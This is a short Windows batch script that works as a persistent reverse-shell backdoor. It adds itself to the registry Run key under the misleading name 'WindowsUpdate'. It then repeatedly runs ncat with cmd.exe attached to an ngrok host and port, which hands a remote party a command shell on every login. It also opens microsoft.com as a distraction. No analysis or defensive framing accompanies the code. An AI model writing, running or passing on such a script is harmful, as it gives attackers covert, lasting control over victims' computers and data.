@echo off

:: 1. Persistence: Add THIS BATCH FILE to the Registry "Run" key
:: This ensures the script itself runs on every login
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /f /d "%~dp0%~nx0"

:: 2. Keep-Alive Loop
:loop
    :: Try to connect to the target
    "%~dp0ncat.exe" -e cmd.exe 7.tcp.eu.ngrok.io 27814
    
    :: If the connection drops (exit code 1), wait 5 seconds then retry
    timeout /t 5 /nobreak >nul
    goto loop

:: 3. Distraction (Optional)
start "" "https://www.microsoft.com"

:: 4. Exit the main script so no window stays open
exit